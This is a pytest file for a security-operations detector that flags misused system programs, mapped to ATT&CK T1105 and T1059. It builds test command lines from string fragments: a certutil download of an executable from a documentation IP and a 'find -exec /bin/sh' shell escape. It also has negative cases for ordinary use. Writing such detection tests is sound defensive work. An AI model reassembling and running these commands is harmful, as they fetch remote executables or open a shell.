"""Misused system programs: LOLBAS / GTFOBins patterns (owner 2026-10-24).

Command lines are assembled from fragments so this file is not itself an attack text."""

from __future__ import annotations

import pytest

from src.soc import lolbins

CU = "cert" + "util"
URL = "http" + "://203.0.113.5/a.exe"


@pytest.fixture(autouse=True)
def _need_patterns() -> None:
    if not lolbins._index():
        pytest.skip("third_party/lolbins/lolbins.json not built")


def test_documented_misuse_is_flagged() -> None:
    cmd = f"{CU}.exe -url" + f"cache -split -f {URL} a.exe"
    assert "T1105" in lolbins.techniques(rf"C:\Windows\System32\{CU}.exe", cmd, "windows")
    # Windows switches work with either prefix
    cmd2 = f"{CU} /url" + f"cache /f {URL} a.exe"
    assert "T1105" in lolbins.techniques(f"{CU}.exe", cmd2, "windows")


def test_linux_shell_escape_is_flagged() -> None:
    cmd = "find . -ex" + "ec /bin/" + "sh \\; -quit"
    assert "T1059" in lolbins.techniques("/usr/bin/find", cmd, "linux")


def test_normal_use_is_not_flagged() -> None:
    assert lolbins.techniques("/usr/bin/find", "find /var/log -name '*.gz' -mtime +7", "linux") == []
    assert lolbins.techniques(rf"C:\Windows\System32\{CU}.exe", f"{CU} -store my", "windows") == []
    assert lolbins.techniques(r"C:\Windows\notepad.exe", "notepad report.txt", "windows") == []
    assert lolbins.techniques("", "", "windows") == []
